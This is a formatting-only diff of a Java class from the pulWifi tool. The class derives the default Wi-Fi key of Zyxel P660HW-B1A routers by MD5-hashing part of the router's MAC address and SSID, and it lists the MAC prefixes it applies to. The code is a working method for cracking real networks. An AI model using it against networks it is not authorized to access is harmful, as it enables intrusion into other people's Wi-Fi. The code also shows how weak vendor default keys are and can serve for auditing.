@@ -1,6 +1,6 @@
 /*
  *  pulWifi , Copyright (C) 2011-2012 Javi Pulido / Antonio Vázquez
- *  
+ *
  *  This file is part of "pulWifi"
  *
  *  "pulWifi" is free software: you can redistribute it and/or modify
@@ -27,7 +27,8 @@ import es.pulimento.wifi.core.WirelessNetwork.WirelessEncryption;
 
 /**
  * Zyxel algorithm. This exploits a vulnerability in ZYXEL P660HW-B1A router.
- * Supported MAC addresses: 00:1F:A4:XX:XX:XX (WLAN_XXXX & JAZZTEL_XXXX)
+ * Supported MAC addresses:
+ * 00:1F:A4:XX:XX:XX (WLAN_XXXX & JAZZTEL_XXXX)
  * F4:3E:61:XX:XX:XX (WLAN_XXXX & JAZZTEL_XXXX)
  */
 public class ZyxelAlgorithm extends CrackAlgorithm {
@@ -61,16 +62,12 @@ public class ZyxelAlgorithm extends CrackAlgorithm {
 	protected String crackAlgorithm(String essid_data, String bssid_data) {
 		essid_data = essid_data.toUpperCase();
 		bssid_data = bssid_data.replace(":", "").toUpperCase();
-		return MD5Hash(
-				bssid_data.substring(0, 8).toLowerCase()
-						+ essid_data.substring(essid_data.length() - 4, essid_data.length()).toLowerCase())
-				.toUpperCase();
+		return MD5Hash(bssid_data.substring(0, 8).toLowerCase() + essid_data.substring(essid_data.length() - 4, essid_data.length()).toLowerCase()).toUpperCase();
 	}
 
 	private static String MD5Hash(String input) {
 		try {
-			String hashtext = (new BigInteger(1, MessageDigest.getInstance("MD5").digest(input.getBytes())))
-					.toString(16);
+			String hashtext = (new BigInteger(1, MessageDigest.getInstance("MD5").digest(input.getBytes()))).toString(16);
 			while (hashtext.length() < 20)
 				hashtext = "0" + hashtext;
 			return hashtext.substring(0, 20);
